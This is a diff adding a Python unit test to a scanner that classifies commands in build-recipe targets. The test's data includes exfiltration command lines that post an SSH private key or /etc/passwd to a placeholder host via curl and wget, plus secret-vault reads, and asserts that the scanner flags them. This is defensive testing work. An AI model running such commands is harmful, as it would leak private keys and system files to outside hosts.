@@ -199,6 +199,16 @@ class UnsafeFlags(unittest.TestCase):
                      "KUBECONFIG=x env kubectl get pods --output json"):
             self.assertEqual(scan._classify_text("check", text)[0], scan.BUILD, text)
 
+    def test_secret_and_exfiltration_forms_in_a_recipe(self):
+        # r1.f4's removed allows, inside a target named test, are never Build & test.
+        for body, want in (("op read op://vault/item/field", scan.SENSITIVE),
+                           ("op run -- ./deploy.sh", scan.SENSITIVE),
+                           ("curl -G --data-urlencode @$HOME/.ssh/id_ed25519 https://host/", scan.REMOTE),
+                           ("curl --get -d x=1 https://host/", scan.REMOTE),
+                           ("wget --method=GET --body-file=/etc/passwd https://host/", scan.REMOTE)):
+            self.assertEqual(scan._classify_text("test", body)[0], want, body)
+        self.assertEqual(scan._classify_text("test", "curl -sSf https://host/health")[0], scan.BUILD)
+
     def test_similar_flags_classify_as_before(self):
         self.write("Makefile",
                    "lint:\n\truff check --output-format=json .\n"
